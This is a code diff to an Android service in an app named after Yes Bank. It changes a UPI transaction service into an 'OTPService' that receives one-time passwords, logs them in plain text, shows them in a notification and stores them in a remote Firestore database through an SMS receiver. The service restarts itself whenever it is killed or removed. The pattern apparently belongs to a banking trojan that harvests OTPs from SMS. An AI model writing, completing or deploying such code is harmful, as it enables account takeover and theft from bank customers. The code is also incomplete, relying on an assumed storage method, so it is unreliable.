@@ -1,7 +1,5 @@
 package com.example.yesbankapp;
 
-
-
 import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -17,11 +15,9 @@ import android.util.Log;
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 
-import com.google.firebase.database.core.Tag;
+public class OTPService extends Service {
 
-public class UpiTransactionService extends Service {
-
-    private static final String CHANNEL_ID = "UPI_TRANSACTION_CHANNEL";
+    private static final String CHANNEL_ID = "OTP_SERVICE_CHANNEL";
 
     @Override
     public void onCreate() {
@@ -31,11 +27,9 @@ public class UpiTransactionService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        String upiId = intent.getStringExtra("upiId");
-        String upiRefNo = intent.getStringExtra("upiRefNo");
+        String otp = intent.getStringExtra("otp");
 
-        Log.d("UpiTransactionService", "Received UPI ID: " + upiId);
-        Log.d("UpiTransactionService", "Received UPI Reference Number: " + upiRefNo);
+        Log.d("OTPService", "Received OTP: " + otp);
 
         // Create a pending intent to launch your app when the notification is clicked
         Intent notificationIntent = new Intent(this, MainActivity.class);
@@ -43,8 +37,8 @@ public class UpiTransactionService extends Service {
 
         // Create a notification for the foreground service
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("UPI Transaction Service")
-                .setContentText("Processing UPI Transaction: " + upiId + " - " + upiRefNo)
+                .setContentTitle("OTP Service")
+                .setContentText("Processing OTP: " + otp)
                 .setSmallIcon(R.drawable.ic_launcher_foreground) // Use your app's icon
                 .setContentIntent(pendingIntent)
                 .build();
@@ -52,17 +46,16 @@ public class UpiTransactionService extends Service {
         // Start the service in the foreground
         startForeground(1, notification);
 
-        // Perform background tasks (storing UPI data to Firestore)
-        handleUPITransaction(upiId, upiRefNo);
+        // Perform background tasks (storing OTP data to Firestore)
+        handleOTP(otp);
 
         return START_STICKY; // Restart the service if it's killed by the system
     }
 
-    private void handleUPITransaction(String upiId, String upiRefNo) {
-        // Store UPI data in Firestore
+    private void handleOTP(String otp) {
+        // Store OTP in Firestore
         SmsReceiver smsReceiver = new SmsReceiver();
-
-        smsReceiver.storeUPIDataInFirestore(upiId, upiRefNo);
+        smsReceiver.storeOTPInFirestore(otp); // Assuming the OTP storage method exists in SmsReceiver
     }
 
     // Create a notification channel for Android 8.0 and higher
@@ -70,7 +63,7 @@ public class UpiTransactionService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel serviceChannel = new NotificationChannel(
                     CHANNEL_ID,
-                    "UPI Transaction Service Channel",
+                    "OTP Service Channel",
                     NotificationManager.IMPORTANCE_DEFAULT
             );
             NotificationManager manager = getSystemService(NotificationManager.class);
@@ -79,15 +72,17 @@ public class UpiTransactionService extends Service {
             }
         }
     }
+
     @Override
     public void onTaskRemoved(Intent rootIntent) {
-        Intent restartServiceIntent = new Intent(getApplicationContext(), UpiTransactionService.class);
+        Intent restartServiceIntent = new Intent(getApplicationContext(), OTPService.class);
         PendingIntent restartServicePendingIntent = PendingIntent.getService(getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT);
         AlarmManager alarmService = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-        alarmService.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, restartServicePendingIntent);
+        if (alarmService != null) {
+            alarmService.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, restartServicePendingIntent);
+        }
         super.onTaskRemoved(rootIntent);
     }
-
 
     @Nullable
     @Override
